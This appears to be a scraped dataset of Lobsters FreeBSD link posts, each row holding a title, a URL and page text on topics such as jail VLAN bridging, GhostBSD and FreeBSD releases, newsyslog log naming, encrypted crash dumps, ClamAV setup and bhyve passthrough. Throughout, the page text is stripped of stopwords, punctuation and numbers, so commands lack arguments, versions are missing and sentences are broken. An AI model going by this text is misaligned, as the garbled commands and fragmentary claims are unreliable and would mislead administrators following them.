vlans logical interface become trunk tagged port bridge ifconfig create ifconfig create ifconfig create ifconfig ifconfig ifconfig ifconfig addm ifconfig addm ifconfig addm create virtual interface epairs jail add b end bridge vlans access untagged port ifconfig create ifconfig create ifconfig create ifconfig create ifconfig create ifconfig create ifconfig ifconfig ifconfig ifconfig ifconfig ifconfig ifconfig addm addm ifconfig addm addm ifconfig addm addm create vnet jail move end epairs host jail see jail command manually creatingdestroying jail jail c vnet persist jail c vnet persist jail c vnet persist jail c vnet persist jail c vnet persist jail c vnet persist ifconfig vnet ifconfig vnet ifconfig vnet ifconfig vnet ifconfig vnet ifconfig vnet assign ip address epairs jail jexec ifconfig jexec ifconfig jexec ifconfig jexec ifconfig jexec ifconfig jexec ifconfig done additional topic allow host access jail directly let host directly access jail assign ip address bridge interface done adding inet following line host etcrcconf inet addm addm addm inet addm addm addm inet addm addm addm also manually ifconfig inet ifconfig inet ifconfig inet let host route traffic jail vlans point jail different vlans subnets communicate packet still go switch avoid packet leaving host enabling ip forwarding host making act router assigning ip address bridge add following line host etcrcconf gatewayenable yes manually enable ip forwarding use following command sysctl note route packet bridge vlans make sure assign ip address bridge described previous section member interface also change default gateway jail switch vlan address host bridge interface address vif addr gw vif addr gw vif addr gw vif addr gw vif addr gw vif addr gw change dynamically run following command jexec route delete default jexec route add default jexec route delete default jexec route add default jexec route delete default jexec route add default jexec route delete default jexec route add default jexec route delete default jexec route add default jexec route delete default jexec route add default bridge parent interface vlans use vlan tagged interface created physical interface parent interface make sure add parent interface bridge arp resolution tagged interface seem cease working reported following prforum thread use another freebsd host emulate switch switch hand setup another freebsd host emulate testing purpose minimal configuration second host act like simple layer switch exactly router capable handling vlan tag clonedinterfaces inet inet inet gatewayenable yes host multiple physical interface like switch clonedinterfaces inet addm addm inet addm addm inet addm addm gatewayenable yes reference revision history
105,Lobsters,freebsd,FreeBSD,GhostBSD 20.04 Now Available,https://ghostbsd.org/20.04_release_announcement,ghostbsd available,changed got fixed since upgrade done already download http wwwghostbsdorgdownload feedback http tmeghostbsd ghostbsd forum find bug http wwwghostbsdorgsupportbugs http forumsghostbsdorg http tmeghostbsd donate become patron donate ghostbsd patron,happy announce availability ghostbsd first thanks people gave feedback reported issue fixed couple problem found release come kernel o update numerous software application update many improvement like replacing gnomemount hald freebsd devd vermaden automount make auto mounting unmounting external device way stable support filesystems changed got fixed since upgrade done already uname u output pkg update fsudo pkg upgrade fnote package upgrade pkg update station datewhere download image checksum hybrid iso dvd usb torrent available http wwwghostbsdorgdownload writing iso usb stick bsd dd linux dd ofdevsdc mac dd feedback anything help get involved maybe want discus experience ask u question please contact u telegram http tmeghostbsd ghostbsd forum find bug please reporting bug make sure related bug reported information report bug http wwwghostbsdorgsupportbugs need help please visit http forumsghostbsdorg http tmeghostbsd donate become patronwe depend get ghostbsd better system please donate even better become patron donate ghostbsd become ghostbsd patron patreon
106,Lobsters,freebsd,FreeBSD,New FreeBSD 11.4-PRERELEASE Snapshots Available,https://lists.freebsd.org/pipermail/freebsd-snapshots/2020-April/000694.html,new freebsd snapshot available,new freebsd snapshot available gjb freebsdorg http downloadfreebsdorgftpsnapshotsisoimages http downloadfreebsdorgftpsnapshotsvmimages http http wwwfreebsdfoundationorgdonate information freebsdsnapshots mailing list,new freebsd snapshot available glen barber gjb freebsdorg thu apr utc begin pgp signed message hash new freebsd development branch installation isos virtual machine disk image uploaded freebsd project mirror development branch installation snapshot intended use production system however encourage testing nonproduction system much possible please also consider installing sysutilspanicmail port help providing freebsd developer necessary information regarding system crash checksum installation isos vm disk image follow end email installation isos installation image available generic generic powerpc generic generic bananapi beaglebone cubieboard cuboxhummingboard rpib wandboard generic note regarding armarmv image convenience without console access system freebsd user password freebsd available default ssh access additionally root user password set root strongly recommended change password user gaining access system snapshot may downloaded corresponding architecture directory http downloadfreebsdorgftpsnapshotsisoimages please patient local mirror yet caught change problem bug report regression report reported bugzilla pr system appropriate mailing list current stable virtual machine disk image vm disk image available following architecture disk image may downloaded following url freebsd project mirror http downloadfreebsdorgftpsnapshotsvmimages image available following disk image format raw qemu vmdk qemu virtualbox vmware vhd qemu xen partition layout freebsdboot gpt partition type bootfs gpt label freebsdswap gpt partition type swapfs gpt label freebsdufs gpt partition type rootfs gpt label note regarding virtual machine image modified qemu efi loader file needed able boot virtual machine image see page information http boot vm image run cpu virt bios qemuefifd serial telnet server nographic drive ifnone filevmdisk device virtioblkdevice device virtionetdevice netdev user sure replace vmdisk path virtual machine image amazon ami image amis available following region region region region region region region region region region region region region region region region region vagrant image image available hashicorp atlas site vmware desktop virtualbox provider installed running vagrant init vagrant iso checksum generic generic powerpc generic generic bananapi beaglebone cubieboard cuboxhummingboard rpib wandboard generic vm image checksum regard glen love freebsd support future release donation freebsd foundation http wwwfreebsdfoundationorgdonate begin pgp signature pmr end pgp signature information freebsdsnapshots mailing list
107,Lobsters,freebsd,FreeBSD,Making newsyslog(8) Timestamp Rotated Logs on FreeBSD,https://blog.tyk.nu/blog/making-newsyslog-timestamp-rotated-logs/,making newsyslog timestamp rotated log freebsd,making newsyslog timestamp rotated log tykling problem alternative making switch ansible task handler conclusion,making newsyslog timestamp rotated log tykling apr utc post way newsyslog name rotated logfiles freebsd explains reconfigure newsyslog timestamp rotated log rather numbering sequentially also explains renamed existing logfiles newsyslog take care rotating log based time size restriction defined etcnewsyslogconf included file default etcnewsyslogconf look like logfilename owner group mode count size flag pidfile signum varlogalllog j varlogauthlog jc varlogconsolelog j varlogcron jc varlogdailylog jn varlogdebuglog jc varloginitlog j varlogkerberoslog j varlogmaillog jc varlogmessages jc varlogmonthlylog jn varlogdevdlog jc varlogsecurity jc varlogutxlog b varlogweeklylog jn include etcnewsyslogconfd include usrlocaletcnewsyslogconfd set rotated kilobyte size rest certain time j flag mean newsyslog compress file similar flag x used xz compression newer installs principle modern time compression bit pointless zfs filesystem live compressed anyway ansible remove compression flag exercise another day newsyslog good job mostly keep never really understood default newsyslog name rotated log sequentially example irc shell nt lot stuff happening log since run service tykling irc l l varlogmessages rwr r root wheel apr varlogmessages rwr r root wheel jan rwr r root wheel jan rwr r root wheel jan rwr r root wheel apr rwr r root wheel jan tykling irc better example might mailserver run postfix log syslog facility mail meaning log go varlogmaillog get rotated daily default syslogd newsyslog configuration tykling l tl varlogmaillog rwr root wheel apr varlogmaillog rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr snip point newsyslog rotates varlogmaillog first appends logfile name compress final name file already exists renamed file already exists renamed retention limit reached remaining file deleted problem mean keep say day worth maillog around mean logrotate operation performed newsyslog start seperate file renames ridiculous get worse renaming file like effectively mean filesystem completely different data filename logfiles every single day mean differential backup system need backup every single byte logfiles every day changed content clearly ideal make zfs snapshot backup take much space need end many copy logfiles finally mean go back certain date see log day best option either check timestamp file count number day calculate whether want alternative sane default would name file rotated daily rotated file would mean file would always named day log contains nice predictable would also mean newsyslog would never need rename old logfiles rotating solving incremental backup issue fortunately newsyslog option waiting utilized timefmt specified newsyslog create rotated logfiles using specified time format instead default sequential filename filename used kept deleted time format described strftime manual page timefmt argument set empty string string default default built time format used timefmt string changed old file created using previous time format automatically removed unless new format similar old format also case changing sequential filename time based file name way around time format contain least year month day hour make sure rotating old logfiles select correct logfiles nt mention default built time format reveal look like rwr root wheel apr maillog rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr rwr root wheel apr yyyymmddthhmmss prefer strftime format dt h date dt h making switch ok changing newsyslog entry etccrontab easy enough add default existing line like tykling grep newsyslog etccrontab root newsyslog default tykling existing log named sequentially two good reason need renamed follow new naming convention first reason simply consistent naming old logfiles log analysis tool easier implement stuff easier find second reason bit concrete newsyslog chance finding old logfiles delete retention limit reached need named like newsyslog would named mean need script rename old logfiles ansible system administration ansible added task change crontab line notify call handler run shell task look like includepaths cat etcnewsyslogconf grep include cut f logpath cat etcnewsyslogconf includepaths grep ev awk print sed e sort u ext xz file l logpath ext mtime stat f sm dt h file newname echo basename file sed e ext mtime ext mv file dirname file newname done done done could well bourne posix sh file binsh shebang line run hand way configured ansible mean change happen automatically gradually next time run ansible server jail script understands newsyslogconf include syntax look path file need renaming included file simply look compressed file varlog place configured etcnewsyslogconf renames file modification time filename unless compressed logfile reason changed since rotated give result newsyslog configured way beginning conclusion done year ago advantage easily outweigh time spent enjoying sensibly named logfiles year come next time write newsyslog probably removing compression letting zfs handle
108,Lobsters,freebsd,FreeBSD,What is FreeBSD?,https://www.sysnettechsolutions.com/en/what-is-freebsd/,freebsd,freebsd freebsd operating system historical basic feature application distribution setup license logo security linux compatibility support community related article,freebsd free unixlike operating system downloaded unix berkeley software distribution bsd unix clone work like unixwhat freebsd operating system initially development based version also known william jolitz operating system personal computer based cpu intel architecture including pentium processorsintelcompatible processor like amd cyrix also supported offer many advanced feature previously available much expensive computersthese feature include preventive multitasking dynamic priority setting provide best resource sharing application usersit completely free operating system meaning pay additional use core source code allows make change improvement compile check result one biggest advantage system like linuxhistoricalthe project two year linux unofficial patchkit nate william come partial split coordinator rod grime jordan k hubbard contrary freebsd trying unified set kernel system application developed separately linux gnu everything developed teamthere distribution concept freebsd precisely one distribution user get confused always use thingit radically different gnulinux license although gnulinux gpl license copyleft license possible derivative work proprietary software mac o xits original goal produce intermediate sample solve number problem patch kit mechanism could solvesome may remember first name interim project name freebsd proposed david greenman walnut creek approved distribution cdrom distribution channel anyone easy access internetwalnut creek supported idea freebsd cdrom also provided mechanism development project fast internet connectionwithout support trust walnut creek unusual newborn project could never fast possibleit successful field internet service specially designed web mail file database serverit said best server operating system term stability efficiency performance compared others like gnulinux window behaves well situation thousand query per minute excessivethese feature due special optimization freebsd kernel certain hardware architecture support compared gnulinuxit also stand one advanced memory management system currently available make swap part smartduring time number unexpected problem arose horizon novell uc berkeley resolved longstanding legal dispute berkeley status one term agreement privilege uc berkeley inherited code novell previously taken return berkeley allowed declare version received free existing user reported switchingthis included freebsd project offer based product july term agreement project permitted latest version moment started challenging task literally reinventing new incomplete project completed transition december january version released internet cdrom given issue version huge success june became robust easy installin august version released well known among i business community launched february end development stable versioncurrently branch maintenance mode performs security work critical problemsolvingfreebsd born november releng branch main development line current first full release made april next version branch took place summer autumn last one july first official version branch released october last version branch released november development smp support alpha dec platform continued cdrom course stream branch snap image netbasic featuresit bsd based system developed computer system research group university california berkeley standard version unixit offer preventive multitasking dynamic priority setting ensure resource best shared apps usersdynamically loadable kernel module allow new file system network protocol binary emulator loaded system without need create new kernelmultiuser access mean different people use system simultaneously different thing system peripheral printer ribbon also shared among user systemyour machine complete tcpip connection including slip ppp nfs ni support performs task like nfs email service www ftp router firewall well acting main servermemory protection ensures application interfere application fails affect operation remaining applicationfreebsd operating system designed way startthe industry standard x window system provides graphical user interface gui common vga card monitor including source codesit dual compatibility many local sco bsdi netbsd linux programsthere hundred readytouse application package collection compatible source code popular commercial unix system requires little modification compile applicationsvirtual memory optional paging continues deliver interactive response user efficiently satisfying memoryintensive applicationsthere shared library allow efficient use disk memory area complete set development tool available c c fortran many additional language included port package collection advanced research developmentthe complete source code entire system offer maximum degree control environmentapplicationsthe application freebsd may exposed limited imagination everything software development automation robot technology inventory control azimuth correction remote satellite antenna done commercial unix product likely done freebsdit benefit significantly thousand highquality application developed research center university around world provided little cost also commercial application appear every daybecause system code available customized way often possible commercial operating system specific application project application freebsd provide internet service make ideal platform robust tcpip internet service integrated freebsdeducation better way learn operating system computer architecture network use full code operating system freebsd number package freely available cad math graphic design make system ideal tool use computer thingsresearch available source code freebsd excellent research platform operating system free distribution feature freebsd made possible remote group work collaborate shared development without worrying private license kind restrictionsnetworking freebsd convert older computer advanced router advanced packet filtering capabilitieswindow workstation freebsd good choice inexpensive x terminal solution using free server one excellent commercial server freebsd allows run application locally well running central serversoftware development freebsd core system includes complete complement development tool including gnu cc compiler debuggerdistributions freebsd launched november released july version freebsd announced november last freebsd november alleged legally requested approval novell unix code freebsd launched october released june version freebsd appeared march latest branch version became january preferred operating system isps web hosting provider considered one stable highperformance operating system entire unix generation among new feature freebsd kqueue introduced freebsd nearly three year development first january widely anticipated support numerous advanced application thread processor ultrasparc platform first version latest version branch may major architectural improvement freebsd major change lowlevel core locking mechanism providing better symmetric multiprocessing smp released core weight lock sometimes called giant lock multiple process run core mode time important change include n native thread implementation called core scheduled asset principle similar timer activationsstarting freebsd kse default thread implementation replaced implementation freebsd applying modular io disk layer iom conversion frame provided poulhenning kamp significantly changed io blockgeom make easy create many function mirroring gmirror encryption gbde geli work supported darpa sponsorshipversions freebsd confirmed branch great stability high release performance despite long development time due large feature set freebsd released november latest version november version continue work enhanced functionality security incident control well optimizing network combine significant performance improvement completely preventive kernel support hardware performance counter hwpmc main success release include removing huge vfs lock implementing optional gear best performance libthr library adding basic security module bsm called openbsm audit execution published trustedbsd project based apple darwin opensource bsm implementation bsd type license freebsd released february latest version freebsd march new feature included sctp daily ufs sun zfs file system experiment port improved support arm architecture jemalloc network important update optimization sound performancebesides linux shown significant speed increase compared previous version freebsd new ule timer greatly improved decided send old timer left ule adjustable compiletime kernel ule default value architecturesstarting version dtrace also integrated version brought support code supporting dec alpha architecture removed freebsd release released june latest stable release superpages included xen domu support virtualization network stack sensational stack protection new usb stack including tty layer rewrite greatly improved zfs support multicast update rewritten nfs clientserver featuresthe addition mmap enhanced device allows application extension nvidia display driver platform version officially released july freebsd first release released january included capsicum capability security mechanism ufs softupdates journal zfs new system setup program bsdinstall flexible resource limiting mechanism rctl flexible software raid application graid virtio driver freebsd released january included zfs support bhyve hypervisor gcc iscsi nand framework root file system also raspberry pi nextgeneration pkg support one newest feature supported october version freebsd launched october stable version supported released obvious feature added version arm architecture support freebsd december version actively development release november feature come release inclusion ati nvidia video card driver port collection adding supportsetupcdroms installed various medium dvdroms floppy disk magnetic tape msdos partition network connection installed directly using anonymous ftp nfsthe sysinstall utility responsible installing operating system several alternative installs system using data local storage device installs downloading necessary file remote server via file transfer protocollicenseit released various opensource license core code latest code generation distributed twosided bsd license allows anyone use redistribute freebsd desired party released three four bsd clause also beerware licensesome device driver contain binary blob hal atheros version earlier code contributed project licensed gpl lgpl isc cddlall code gpl cddl license clearly separated code liberal license make easier user builtin device manufacturer use free software licensesclangbsd aim replace gpl dependency basic system replacing gnu compiler collection bsd llvm compilermetallic noise license clangbsd became important milestone independent development april mascot generic bsd daemon also known beastie logo many year general bsd daemon also called beastie strange phonetic pronunciation bsd first appeared unix tshirts bought bell lab popular version bsd background program work animation director john lasseter launched specific version freebsd later prepared tatsumi hosokawa year beastie loved criticized perhaps suitable institutional massmarket exposurealso exclusive freebsd lithographically graphic lasseter line art often require controlled printing process fourcolor offset photograph stay true original physical surface paperthe bsd background program made difficult reproduce reliably simple logo considering highly detailed graphic grow right size aesthetically dependent multiple shadesdue concern contest opened new logo designed anton k gural whose bsd background program still reverberant released october extremely important release engineering group reflected different area security issue patch fix go security team released available user known advisory security team justified reputation speed solving security problemsone frequently encountered problem open source software insufficiency application run ten thousand project developing open source application course rigor term security freebsd problem stopped thanks vuxmlit consists database security issue appear stored database intersects knowledge program port collection application included freebsdthere portaudit application quickly determine whether vulnerable get description problem link find detailed information problemit also provides several mechanism administrator meet security requirement operating system need jail utility program allows administrator cage process ideal application work chroot environmentchflags utility increase security provided traditional unix permission system example changing one given file may prohibited even possible forbid super user change delete themit offer embedded natsupported firewall allow choose appropriate rule security need situationthe freebsd kernel changed easily allowing administrator remove unnecessary feature also support dynamic module tool loading downloading viewing module kernelsysctl allows administrator view configure large number kernel feature without restart machinelinux compatibilitymost software running linux run without compatibility layer however still provides compatibility layer unixlike operating system including linuxtherefore linux binary run special application distributed binary format onlywhile running linux binary file local freebsd program given performance penalty case may perform smoothly linuxhowever layer completely transparent linux binary used freebsd partiallysupportit supported active community hundred mailing list many newsgroups also large number user group various irc channel worldwide commercial support also received one company providing commercial product service andor consulting servicescommunitythis community consists professional interested discussing fact technique spending time discussing idea participating holy war way freebsd list forum generally good signalnoise ratio related ubuntu kali linux linux mint debian gnu
109,Lobsters,freebsd,FreeBSD,Building FreeBSD Binary Packages,https://blahg.josefsipek.net/?p=592,building freebsd binary package,,laptop use binary package provided freebsd port sometimes however want rebuild package want change option example recently wanted set debugon mutt easy whatever reason never find doc concise set step accomplish next time need portsnap fetch portsnap update cd usrportssomething make showconfig make rmconfig reset config needed make clean needed make package pkg install workpkg txz
110,Lobsters,freebsd,FreeBSD,Transfer Files over WiFi from Your Computer to Your Mobile Device by Scanning QR Code,https://github.com/claudiodangelis/qrcp,transfer file wifi computer mobile device scanning qr code,qrcp telegram channel qrcpdev work installation install latest development version go linux release raspberry pi release using package manager archlinux deb package ubuntu debian etc release page rpm package centos fedora etc release page window release page scoop scoop macos release page usage send file send file send multiple file zip file transferring receive file receive file current directory receive file specific directory option configuration file port network interface url keep server alive author qrcp qrfiletransfer claudio dangelis developed community join u credit arasatasaygin openlogos rule openlogos goreleaser clone similar project qrfileshare instantfiletransfer qrfiletransfer qrfiletransfer qrtransfernode qrdeliver qrfile quicktransfer sharefileqr sharefiles ezshare localfileshare qrcp license license,qrcp transfer file wifi computer mobile device scanning qr code without leaving terminal support development donating join telegram channel qrcpdev news development work qrcp bind web server address wifi network interface random port creates handler default handler serf content exit program transfer complete used receive file qrcp serf upload page handle transfer tool print qr code encodes text http address port randompath qr apps detect url decoded text act accordingly ie open decoded url default browser qr code scanned content begin downloading mobile browser send file mobile receive file mobile installation install latest development version go note requires go go get githubcomclaudiodangelisqrcp linux download latest linux targz archive release page extract move binary proper directory set execution permission extract archive tar xf copy binary sudo mv qrcp usrlocalbin set execution permission sudo chmod x usrlocalbinqrcp raspberry pi following arm release available release page using package manager archlinux package available aur deb package ubuntu debian etc download latest deb package release page run dpkg sudo dpkg confirm working qrcp version rpm package centos fedora etc download latest rpm package release page run rpm sudo rpm confirm working qrcp help window download latest window targz archive release page extract exe file scoop use scoop package management window install qrcp following oneliner scoop install qrcp macos download latest macos targz archive release page extract move binary proper directory set execution permission extract archive tar xf copy binary sudo mv qrcp usrlocalbin set execution permission sudo chmod x usrlocalbinqrcp confirm working qrcp help usage send file send file send multiple file sending multiple file qrcp creates zip archive file folder want transfer deletes zip archive transfer complete multiple file qrcp mydocumentpdf whole folder qrcp document zip file transferring choose zip file transferring receive file receiving file qrcp serf upload page choose file mobile receive file current directory qrcp receive receive file specific directory note folder must exist qrcp receive outputtmpdir option qrcp work without prior configuration however choose configure use specific value config command launch wizard let configure parameter like interface port fullyqualified domain name keep alive note network interface showing use listallinterfaces flag suppress interface filter qrcp listallinterfaces config configuration file default configuration file stored homeqrcpjson however specify location config file passing config flag qrcp config tmpqrcpjson mydocumentpdf port default qrcp listens random port pas port p flag choose specific one qrcp port mydocumentpdf network interface qrcp try automatically find suitable network interface use transfer one suitable interface found asks choose one want use specific interface pas interface flag webserver visible computer interface network qrcp mydocumentdpf also use special interface name bind web server making web server visible everyone network even external network useful want transfer file amazon digital ocean droplet google cloud platform compute instance vps qrcp mydocumentpdf url qrcp us two pattern url send http ip address port send random path receive http ip address port receive random path option available override pattern pas path flag use specific path url example resulting url http ip address port sendx qrcp pathx mydocumentpdf pas fqdn use fully qualified domain name instead ip useful combination using remote location resulting url http qrcp fqdn examplecom p myremotedocumentpdf keep server alive useful keep server alive transferring file example want transfer file multiple device use keepalive flag server shutdown automatically first transfer qrcp keepalive mydocumentpdf author qrcp originally called qrfiletransfer started idea claudio dangelis twitter current maintainer developed community join u credit logo provided arasatasaygin part openlogos initiative collection free logo open source project check rule claim one rule openlogos release handled goreleaser clone similar project qrfileshare similar idea executed nodejs react interface instantfiletransfer uncredited nodejs project similar qrfiletransfer python clone project qrfiletransfer another nodejs clone project qrtransfernode another nodejs clone project qrdeliver nodejs project similar qrfile transfer file scanning qr code quicktransfer nodejs clone project sharefileqr python reimplementation project sharefiles uncredited yet another nodejs clone project ezshare another nodejs two way file sharing tool supporting folder multiple file localfileshare share local file people smartphone download file pc qrcp desktop app clone qrcp writing c net core work window license mit see license
111,Lobsters,freebsd,FreeBSD,EKCD - Encrypted Crash Dumps in FreeBSD,https://oshogbo.vexillium.org/blog/74/,ekcd encrypted crash dump freebsd,networking crash dump presentation openssl man page,time ago describing configure networking crash dump post mentioned also possibility encrypt crash dump today look functionality initially implemented google summer code friend konrad witaszczyk made available freebsd understand polish also look presentation bsdpl gave comprehensive review kernel crash dump feature main issue crash dump may include sensitive information available memory crash contain data kernel userland like password private key etc dumping written unencrypted storage somebody took hard drive could access sensitive data sending crash dump network may captured third party locally data written directly dump device skipping geom subsystem purpose allow kernel write crash dump even case panic occurs geom subsystem mean crash dump automatically encrypted geli protect privacy encrypt crash freebsd offer possibility functionality called ekcd encrypted kernel crash dump idea behind administrator security officer company generates rsa key public key provided machine key loaded machine generates onetime aes key used encrypt actual crash dump aes key encrypted using rsa key stored machine owner private key decrypt aes key hence whole crash dump familiar cryptography pretty standard practice limitation rsa key knowing theory let look configure freebsd box first check freebsd box ekcd build using generic kernel verify using example config command config x bootkernelkernel grep ekcdoptions ekcd supervisor generates rsa key public key hide safe openssl genrsa privatepem may also interested encrypting key option like detail refer openssl man page read public key openssl rsa privatepem outform pem pubout publicpem transfer publicpem remote machine want encrypt dump import key scp publicpem dumpon k publicpem know wait crash occurs may take test panic kernel following sysctl remember test safe environment critical operation performed sysctl machine come back use savecore save encrypted core dump device create couple file keyx aes key encrypted rsa public key vmcoreencryptedx encrypted aes key core dump transfer file machine private key use decrypt core decrypt core savecore varcrash decryptcore p privatepem k e c analyze dump example ekcd pretty interesting new feature freebsd thanks may able protect privacy user sharing hosting generally company configuration straightforward real reason use
112,Lobsters,freebsd,FreeBSD,8 Bay TrueNAS Core ZFS NAS Build Walkthrough in SilverStone CS381 Chassis,https://www.youtube.com/watch?v=COoChGWVfNw,bay truenas core zfs na build walkthrough silverstone chassis,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature truenas core zfs na build walkthrough silverstone chassis youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature truenas core zfs na build walkthrough silverstone chassis youtube
113,Lobsters,freebsd,FreeBSD,FreeBSD Foundation - 500% if_bridge Performance Improvement,https://www.freebsdfoundation.org/blog/500-if_bridge-performance-improvement/,freebsd foundation ifbridge performance improvement,freebsd foundation grant kristof provost harness new parallel technique uncork performance bottleneck kristof provost olivier cochardlabbé pfsync community grant mayjune issue freebsd journal,freebsd foundation grant kristof provost harness new parallel technique uncork performance bottleneck independent embedded system developer kristof provost certainly know way around networking stack past several year since george nevilleneil approached asiabsdcon offer refuse maintained freebsd port openbsd packet filter pf firewall even used benefited kristof work clean fragment handling firewall engagement orange france telecom mark beginning particular story turnover bn orange mission ensure digital service well thoughtout made available used caring inclusive sustainable way area business freebsd play role mission serving o orange business gateway device olivier cochardlabbé time worked network engineer orange discovered pfsync performance issue recruited kristof come fix olivier recognized networking expert founded freenas bsd router project freebsd port committer olivier set project success well said kristof interview blog extensively researched issue provided benchmark flame graph really sped work week coding testing another commit work spread across month kristof patch doubled pfsync performance course research olivier also found performance issue ifbridge tool effectively turn freebsd machine switch freebsd foundation agreed fund kristof work ifbridge community grant kristof provides detailed technical review work mayjune issue freebsd journal purpose suffice say current ifbridge implementation contends heavily single bridgelock mutex mutexes way ensure data integrity allowing one core access data time unfortunately ifbridge implementation stop core thing switch forwarding packet let say core writing limit throughput million packet per second regardless number core system iterating option kristof ultimate solution take advantage epoch freebsd current clever use concurrency epoch allows safe use protected data structure without acquiring lock either mutex readwrite lock kristof explains article final result still perform one modification bridge state eg adding interface learning interface use given mac address time keep processing packet cpu core new ifbridge implementation forward million packet per second improvement behalf user ifbridge freebsd foundation wish give kristof hearty thank amazing improvement detail sure check kristof article mayjune issue freebsd journal
114,Lobsters,freebsd,FreeBSD,HardenedBSD April 2020 Status Report,https://hardenedbsd.org/article/shawn-webb/2020-04-24/hardenedbsd-april-2020-status-report,hardenedbsd april status report,,hey hardenedbsd community since written status report definitely time past month put focus infrastructure stability merge conflict resolution work exploit mitigation still somewhat pause though made slight progress crossdso cfi build infrastructure hosted current employer year grateful inc huntington ingalls industry support help ensuring continued success project five year service current employer tendered letter resignation people met project worked culture virtue instilled made fall love decided take new employment opportunity blackhawknest host hardenedbsd build infrastructure room grow architected infrastructure migration mostly plugnplay needing change ip address plan shut infrastructure preparation migration may one week advance start date build resume infrastructure deployed new facility note published build package repos still accessible build infrastructure separate infrastructure serving build package repos currently date infrastructure back online suspect around two three week may excited new opportunity especially blackhawknest agreeing host build infrastructure positive relationship hardenedbsd blackhawknest symbiotic thank much help support project
116,Lobsters,freebsd,FreeBSD,Install and Configure ClamAV on FreeBSD,https://blog.socruel.nu/freebsd/how-to-install-and-configure-clamav-on-freebsd.html,install configure clamav freebsd,install configure clamav freebsd freebsd clamav clamav clamav freebsd port tree technical requirement freebsd install clamav software freebsd clamav configure freshclam enable freshclam add signature clamav clamav securiteinfo clamav securiteinfo securiteinfo securiteinfo run clamscan resource,install configure clamav freebsd freebsd based file server part socruelnu infrastructure time device accessing file server antivirus software installed configured file server decided install configure clamav file server clamav open source antivirus engine using different virus signature database used variety situation including protecting end point clamav freebsd port tree installation part easy technical requirement following requirement place able implement described post date supported freebsd system version install clamav software use package system freebsd install clamav software sudo pkg install clamav package also installs clamav user group creates file usrlocaletcrcd directory clamavclamd clamavfreshclam clamd scan file directory demand freshclam update virus database requirement scan file server file offline frequent basis clamd used case configure freshclam freshclam configuration file called freshclamconf usrlocaletc directory case following configuration used databasedirectory vardbclamav updatelogfile varlogclamavfreshclamlog logfilemaxsize logtime yes logverbose yes logrotate yes logsyslog yes logfacility logdaemon pidfile varrunclamavfreshclampid databaseowner clamav dnsdatabaseinfo currentcvdclamavnet databasemirror databaseclamavnet maxattempts scriptedupdates yes compresslocaldatabase check connecttimeout receivetimeout testdatabases yes safebrowsing yes bytecode yes please see man freshclamconf detail configuration line enable freshclam configuration file place enable freshclam sudo sysrc clamavfreshclamenable yes sudo service clamavfreshclam start see freshclam done job couple minute freshclam daemon downloaded virus signature database file vardbclamav directory sudo l sla vardbclamav total drwxrxrx clamav clamav feb drwxrxrx root wheel feb rwr r clamav clamav feb bytecodecvd rwr r clamav clamav feb dailycvd rwr r clamav clamav feb maincvd rwr r clamav clamav feb safebrowsingcvd time progress see file updated regular basis based setting man freshclamconf file see add signature clamav come virus database also possible add third party virus signature database clamav configuration one company securiteinfo provides lot additional antiviral signature clamav securiteinfo provides basic free charge subscription paid professional subscription sign use securiteinfo virus signature login copy paste line setup tab freshclamconf file databasecustomurl http wwwsecuriteinfocomgetsignaturessecuriteinfohdb databasecustomurl http databasecustomurl http wwwsecuriteinfocomgetsignaturesjavascriptndb databasecustomurl http wwwsecuriteinfocomgetsignaturesspammarketingndb databasecustomurl http wwwsecuriteinfocomgetsignaturessecuriteinfohtmlhdb databasecustomurl http wwwsecuriteinfocomgetsignaturessecuriteinfoasciihdb databasecustomurl http wwwsecuriteinfocomgetsignaturessecuriteinfoandroidhdb databasecustomurl http wwwsecuriteinfocomgetsignaturessecuriteinfooldhdb databasecustomurl http wwwsecuriteinfocomgetsignaturessecuriteinfopdfhdb restarting freshclam service sudo service clamavfreshclam restart see securiteinfo signature database file vardbclamav directory sudo l sla vardbclamavsecuriteinfo rwr r clamav clamav mar vardbclamavsecuriteinfohdb rwr r clamav clamav mar rwr r clamav clamav mar vardbclamavsecuriteinfoandroidhdb rwr r clamav clamav mar vardbclamavsecuriteinfoasciihdb rwr r clamav clamav mar vardbclamavsecuriteinfohtmlhdb rwr r clamav clamav mar vardbclamavsecuriteinfooldhdb rwr r clamav clamav mar vardbclamavsecuriteinfopdfhdb run clamscan virus database scan directory file create directory store infected file found scan sudo mkdir vardbclamavquarantine sudo chown clamav clamav vardbclamavquarantine scan directory recursively using clamscan tool including writing log sudo clamscan r logvardbclamavscanlog movevardbclamavquarantine directorytoscan option clamscan tool see man clamscan easily write shell script make task clever left reader resource resource subject updated april
117,Lobsters,freebsd,FreeBSD,Using bhyve PCI Passthrough on OmniOS,https://www.cyber-tec.org/2019/05/29/using-bhyve-pci-passthrough-on-omnios/,using bhyve pci passthrough omnios,omnios bhyve hypervisor page simple overview global zone network configuration configure passthrough device via ppt ppt use zonecfg configure guest zone finish configuration creating zone configure freebsd bhyve guest test network configuration,hardware supported illumos yet luckily bhyve support pci passthrough guest operating system continue omnios desktop modern hardware would love wifi support using bhyve guest router zone provide required driver first requires uptodate omnios version provide bhyve support including following ip package pkg install systembhyve pkg install systemzonesbrandbhyve also found additional system requirement omnios bhyve hypervisor page simple overview inet global zone bhyve zone pciwifi passthrough wifidevice nat vnic etherstub vnic global zone network configuration etherstub required provides virtual switch virtual nic global zone one bhyve zone dladm createetherstub required assign virtual nics etherstub dladm createvnic l dladm createvnic l verify configuration dladm showvnic also required assign ip address vnic allow communication bhyve zone ipadm createaddr static choose whatever network like communication two nics choose network configure passthrough device via ppt lookup pci information device like passthrough bhyve zone example looking wireless network card prtconf dd intel corporation centrino adv look correct pciex entry nt got working pci entry prtpicl v tool might also provide additional information pci device pciex information need stored following two file etcpptaliases look similar etcdriveraliases file overwrite assign required ppt driver device etcpptmatches file contains pci information reboot recommended attach driver device verification done following command look attached driver device use pptadm list dev path pptadm list dev vendor device path pci used later passthrough bhyve zone use zonecfg configure guest zone bhyve zone required create dataset zonepath zvol contains guest zone called gw gateway internet create zvol zfs create v create zonepath zfs create rpoolzonesgw create dataset isos zfs create rpooliso download latest freebsd operating system like iso store rpooliso look like cd rpooliso wget freebsdiso http downloadfreebsdorg 